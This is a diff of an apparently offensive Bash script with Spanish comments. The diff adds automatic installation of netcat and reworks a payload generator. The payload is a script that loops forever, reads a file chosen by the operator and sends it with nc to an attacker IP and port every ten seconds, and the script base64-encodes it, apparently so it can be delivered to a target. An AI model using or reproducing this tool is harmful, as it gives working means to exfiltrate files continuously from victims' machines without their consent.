@@ -40,6 +40,16 @@
       exit
   fi
 
+# Comprobar si el paquete netcat-openbsd está instalado. Si no lo está, instalarlo.
+  if [[ $(dpkg-query -s netcat-openbsd 2>/dev/null | grep installed) == "" ]]; then
+    echo ""
+    echo -e "${cColorRojo}  El paquete netcat-openbsd no está instalado. Iniciando su instalación...${cFinColor}"
+    echo ""
+    sudo apt-get -y update
+    sudo apt-get -y install netcat-openbsd
+    echo ""
+  fi
+
 # Definir variables
   vIPAtacante="$1"
   vPuertoAtacante="$2"
@@ -48,7 +58,7 @@
   vRutaAlArchivo="$5"
 
 # Crear payload en base 64
-  vABase64='printf "#!/bin/bash\nwhile true; do\n  cat '"$vRutaAlArchivo"' | nc '"$vIPAtacante"' '"$vPuertoAtacante"'\n  sleep 10\ndone\n"'
+  vABase64=$(printf "#!/bin/bash\nwhile true; do\n  cat '"$vRutaAlArchivo"' | nc "$vIPAtacante" "$vPuertoAtacante"\n  sleep 10\ndone\n")
   echo ""
   echo "Cadena a pasar a base64:" "$vABase64"
   echo ""
